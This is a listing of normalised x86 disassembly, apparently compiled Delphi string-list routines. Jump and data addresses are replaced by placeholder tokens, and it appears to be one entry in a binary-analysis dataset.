mov eax [ ebx + 0x8 ]
call sub_413fac
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_414dac
xor ecx ecx
mov edx esi
mov eax ebx
call sub_414a10
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_414094
sub_4150c8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_4141f0
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4142a4
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_413ff8
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_414a10
mov eax ebx
call sub_414dac
pop edi
pop esi
pop ebx
retn
sub_41511c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_414108
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_41514c
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_415170
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_415d54
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4146f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_4151a0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4151c4
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_4151e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41528f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_415338
xor eax eax
push ebp
push sub_415272
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415279
mov eax [ ebp - 0x4 ]
call sub_4153f4
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_4152a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41471c
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_415338
xor eax eax
push ebp
push sub_415320
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4153f4
retn
sub_415350
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_415408
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_4153a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_415bec
mov eax [ ebp - 0x8 ]
push eax
push sub_415f48
push ebp
call sub_415350
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415408
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41549d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4154a4
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f1c
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_404304
jne r-xdata
sub_4154b4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4154b0
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
jmp sub_4038b0
sub_4154ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415534
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405a5c
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_4154b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41553b
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_415544
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41561c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_415338
xor eax eax
push ebp
push sub_4155fa
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415601
mov eax [ ebp - 0x4 ]
call sub_4153f4
retn
sub_415638
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41567d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4043b8
call sub_40886c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415684
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_41568c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415797
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_403f90
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_403fe8
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41579e
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f1c
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4041b8
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_4041b8
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_4041b8
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028e0
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028e0
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_4041b8
mov ebx eax
test ebx ebx
je r-xdata
sub_4157b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_415833
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_403ef8
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4041b8
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
pop eax
call sub_404418
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41583a
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
sub_415840
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4158b8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4158bf
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_4158cc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41598f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404418
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_415fd8
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_4040e0
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c384
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415996
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f1c
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
sub_4159a0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_4159d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_415a04
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416b14
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415a4c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415a53
mov eax [ ebp - 0x4 ]
call sub_403124
retn
sub_415a58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415af5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_415338
xor eax eax
push ebp
push sub_415ad8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_416660
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_403fe8
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415adf
mov eax [ ebp - 0x4 ]
call sub_4153f4
retn
sub_415b04
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415ba5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415bac
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
mov eax [ ebp - 0x4 ]
call sub_415338
xor eax eax
push ebp
push sub_415b88
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4153f4
retn
sub_415bb4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_415bec
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415c90
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_418980
mov eax [ ebp - 0x4 ]
call sub_415338
xor eax eax
push ebp
push sub_415c6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_417a1c
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_419620
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415c72
mov eax [ ebp - 0x4 ]
call sub_4153f4
retn
sub_415c9c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416b14
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415ce7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415cee
mov eax [ ebp - 0x4 ]
call sub_403124
retn
sub_415cf4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415d41
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4041b8
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4168c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415d48
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_415d54
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_4055b0
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_415d88
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415dcb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4040f0
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415dd2
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_415dd8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415e8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_415338
xor edx edx
push ebp
push sub_415e6f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415e76
mov eax [ ebp - 0x4 ]
call sub_4153f4
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_403fe8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_415e9c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_415f38
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test esi esi
jl r-xdata
test esi esi
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415f3f
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f1c
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov eax ebx
call sub_415fd8
mov edx eax
lea eax [ ebp - 0xc ]
call sub_4040e0
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404278
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
sub_415f48
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415fbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41a1cc
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41a1d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415fc5
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41a274
inc esi
dec ebx
jne r-xdata
sub_415ff0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41600c
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_415170
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404980
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_416074
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4154ec
jmp r-xdata
sub_416110
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404980
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_416150
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4154ec
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
